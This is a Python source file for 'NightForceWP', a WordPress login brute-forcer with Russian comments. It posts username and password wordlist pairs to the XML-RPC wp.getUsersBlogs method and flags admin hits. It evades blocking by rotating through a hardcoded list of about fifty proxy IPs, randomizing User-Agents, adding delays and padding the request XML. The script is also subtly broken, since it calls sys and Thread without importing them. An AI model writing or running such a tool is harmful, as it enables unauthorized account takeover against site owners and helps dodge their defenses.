import os
import random
import requests
import time
import argparse
import logging
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, init

# Инициализация colorama и логирования
init(autoreset=True)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

__author__ = 'MidN1ght'

# ASCII баннер
banner = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠀⠀
⠀⠀⠘⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠃⠀⠀
⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⠀⠀⢀⣤⣾⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠛⢿⣿⣶⣦⠈⣿⡟⢻⡟⢻⣿⠁⣴⣶⣿⡿⠛⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣉⠛⠋⣠⡿⢀⣾⣷⡀⢿⣄⠙⠛⣉⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣴⣄⠀⣿⡉⢉⣉⣤⣾⣿⣿⣷⣤⣉⡉⢉⣿⠀⣠⣦⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢻⣿⠀⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⠀⣿⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢹⡀⢹⣧⠈⠉⠛⠋⢁⡈⠙⠛⠉⠁⣼⡏⢀⡏⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣧⠈⣿⣦⣀⡀⠄⢸⡇⠠⢀⣀⣴⣿⠁⣼⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠀⠸⠿⣏⠀⢤⣾⣷⡤⠀⣹⠿⠇⠀⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⡤⠀⣀⣉⣉⣀⠀⢤⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢀⡀⠀⡀⢀⠀⢀⡀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⢶⣶⣶⡶⠞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

███╗░░██╗██╗░██████╗░██╗░░██╗████████╗███████╗░█████╗░██████╗░░█████╗░███████╗░██╗░░░░░░░██╗██████╗░
████╗░██║██║██╔════╝░██║░░██║╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝░██║░░██╗░░██║██╔══██╗
██╔██╗██║██║██║░░██╗░███████║░░░██║░░░█████╗░░██║░░██║██████╔╝██║░░╚═╝█████╗░░╚██╗████╗██╔╝██████╔╝
██║╚████║██║██║░░╚██╗██╔══██║░░░██║░░░██╔══╝░░██║░░██║██╔══██╗██║░░██╗██╔══╝░░░░████╔═████║░██╔═══╝░
██║░╚███║██║╚██████╔╝██║░░██║░░░██║░░░██║░░░░░╚█████╔╝██║░░██║╚█████╔╝███████╗░░╚██╔╝░╚██╔╝░██║░░░░░
╚═╝░░╚══╝╚═╝░╚═════╝░╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░░░░░╚════╝░╚═╝░░╚═╝░╚════╝░╚══════╝░░░╚═╝░░░╚═╝░░╚═╝░░░░░


NIGHTFORCEWP v.1.0.1       Author: ~MidN1ght~
EXAMPLE:
python nightforce.py --usernames user.txt --passwords pass.txt --url "https://example.com/ --use-proxies"
-u --usernames   wordlist username
-p --passwords   wordlist passwords
--url            "https://example.com/" 
--use-proxies    on/off list proxies in script
"""

print(banner)

# Прокси-список
proxies = [
    {"http": "http://203.19.38.114:1080"},
    {"http": "http://142.93.202.130:3128"},
    {"http": "http://159.65.245.255:80"},
    {"http": "http://4.175.200.138:8080"},
    {"http": "http://164.92.164.95:80"},
    {"http": "http://41.196.0.163:8082"},
    {"http": "http://62.171.168.103:80"},
    {"http": "http://77.37.41.168:80"},
    {"http": "http://191.102.248.7:8084"},
    {"socks5": "socks5://192.99.169.19:8450"},
    {"socks5": "socks5://92.205.108.94:52929"},
    {"socks5": "socks5://185.225.226.181:1080"},
    {"socks5": "socks5://62.182.83.214:1080"},
    {"socks5": "socks5://188.34.187.35:1080"},
    {"https": "https://158.101.93.164:8080"},
    {"http": "http://193.122.57.130:80"},
    {"http": "http://191.102.248.7:8084"},
    {"socks5": "socks5://207.180.253.143:49646"},
    {"http": "http://147.28.155.20:10063"},
    {"https": "https://72.10.160.93:17081"},
    {"socks5": "socks5://50.63.12.101:13636"},
    {"socks4": "socks4://165.227.196.37:59555"},
    {"http": "http://197.255.126.69:80"},
    {"http": "http://94.103.92.163:3128"},
    {"socks5": "socks5://31.170.22.127:1080"},
    {"socks5": "socks5://178.255.44.62:45209"},
    {"http": "http://87.248.129.26:80"},
    {"socks5": "socks5://162.240.217.45:59881"},
    {"http": "http://122.10.225.55:8000"},
    {"https": "https://210.61.207.92:80"},
    {"http": "http://47.91.104.88:3128"},
    {"socks4": "socks4://47.91.109.17:1720"},
    {"socks4": "socks4://47.91.110.148:9080"},
    {"socks4": "socks4://47.91.109.17:80"},
    {"socks4": "socks4://47.91.110.148:80"},
    {"http": "http://47.91.110.148:8443"},
    {"http": "http://185.162.231.32:80"},
    {"http": "http://185.162.229.254:80"},
    {"http": "http://185.162.231.33:80"},
    {"http": "http://185.162.229.237:80"},
    {"http": "http://185.162.230.128:80"},
    {"http": "http://185.162.229.155:80"},
    {"http": "http://185.162.230.214:80"},
    {"http": "http://5.10.247.225:80"},
    {"http": "http://5.10.245.141:80"},
    {"http": "http://5.10.245.197:80"},
    {"http": "http://5.10.245.165:80"},
    {"http": "http://5.10.247.239:80"},
    {"http": "http://5.10.246.234:80"},
    {"https": "https://79.106.36.84:8989"},
    {"socks5": "socks5://195.154.43.86:13382"},
    {"socks5": "socks5://212.83.142.149:32332"},
    {"socks5": "socks5://212.83.143.103:56972"},
    {"socks5": "socks5://212.83.138.172:55465"}
]


# Настройка случайного User-Agent
ua = UserAgent()

# Очереди для паролей и пользователей
user_queue = []
password_queue = []
results_log = []

# Функция для отображения индикатора загрузки
def loading_indicator():
    for i in range(101):
        sys.stdout.write(f"\rChecking proxies: {i}% [{'=' * (i // 2)}{'-' * (50 - (i // 2))}]")
        sys.stdout.flush()
        time.sleep(0.1)  # Задержка для демонстрации

def check_proxies(proxies):
    """Проверяет работоспособность прокси и возвращает рабочие прокси."""
    working_proxies = []
    for proxy in proxies:
        if check_proxy(proxy):
            working_proxies.append(proxy)
    return working_proxies

def check_proxy(proxy):
    """Проверяет работоспособность прокси и возвращает True, если работает."""
    try:
        response = requests.get("http://httpbin.org/ip", proxies=proxy, timeout=5)
        if response.status_code == 200:
            return True
    except requests.RequestException:
        return False
    return False

def randomize_data(user, password):
    # Случайное добавление дополнительного поля
    additional_field = f"<additionalField>{random.randint(1, 100)}</additionalField>"
    data = f"<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>{user}</string></value></param><param><value><string>{password}</string></value></param>{additional_field}</params></methodCall>"
    return data

def request_with_retries(url, user, password, retries=3):
    for attempt in range(retries):
        try:
            headers = {
                "User-Agent": ua.random,
                "Connection": "keep-alive",
                "Accept": "text/html"
            }
            data = randomize_data(user, password)

            proxy = random.choice(proxies) if use_proxies else None
            response = requests.post(url, data=data, headers=headers, proxies=proxy, timeout=10)
            logging.info(f"Trying {user}:{password} - Status: {response.status_code} - Proxy: {proxy}")

            if "isAdmin" in response.text:
                results_log.append(f"[SUCCESS] Found credentials: {user}:{password}")
                return True
            else:
                results_log.append(f"[FAILED] {user}:{password}")
                return False

        except requests.RequestException as e:
            logging.warning(f"Error: {e} (Attempt {attempt + 1}/{retries})")
            if attempt < retries - 1:
                time.sleep(random.uniform(1, 2))  # Задержка для обхода блокировки
            continue
    return False

def brute_force(url, user, password):
    """Выполняет брутфорс для заданного пользователя и пароля"""
    if request_with_retries(url, user, password):
        print(Fore.GREEN + f"[SUCCESS] Found credentials: {user}:{password}")
        os._exit(0)

def main():
    global use_proxies, proxies

    parser = argparse.ArgumentParser(description="NightForceWP: WordPress brute-forcer")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('--usernames', help='File with usernames')
    group.add_argument('--emails', help='File with emails')
    parser.add_argument('-p', '--passwords', required=True, help='File with passwords')
    parser.add_argument('--url', required=True, help='Target URL for WordPress login')
    parser.add_argument('--use-proxies', action='store_true', help='Enable using proxies')
    args = parser.parse_args()

    use_proxies = args.use_proxies

    # Загрузка данных из файлов
    try:
        if args.usernames:
            with open(args.usernames, 'r', encoding='latin-1') as user_file:
                users = user_file.read().splitlines()
        elif args.emails:
            with open(args.emails, 'r', encoding='latin-1') as email_file:
                users = email_file.read().splitlines()

        with open(args.passwords, 'r', encoding='latin-1') as pass_file:
            passwords = pass_file.read().splitlines()
    except FileNotFoundError as e:
        logging.error(f"File not found: {e.filename}")
        return

    if use_proxies:
        loading_thread = Thread(target=loading_indicator)
        loading_thread.start()
        proxies = check_proxies(proxies)
        loading_thread.join()
        if not proxies:
            logging.warning("No working proxies found. Continuing without proxies.")
            use_proxies = False

    user_queue.extend(users)
    password_queue.extend(passwords)

    max_threads = 5  # Увеличение количества потоков

    # Ограничение на количество попыток для каждого user:password
    attempts_limit = 5

    # Случайный порядок запросов
    random.shuffle(user_queue)
    random.shuffle(password_queue)

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [
            executor.submit(brute_force, args.url, user, password)
            for user in user_queue for password in password_queue[:attempts_limit]  # Лимит на количество попыток
        ]

        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                logging.error(f"[ERROR] {e}")

    if not results_log:
        print(Fore.RED + "\n[INFO] Brute force failed. Credentials not found.")
    else:
        for result in results_log:
            print(result)

if __name__ == "__main__":
    main()
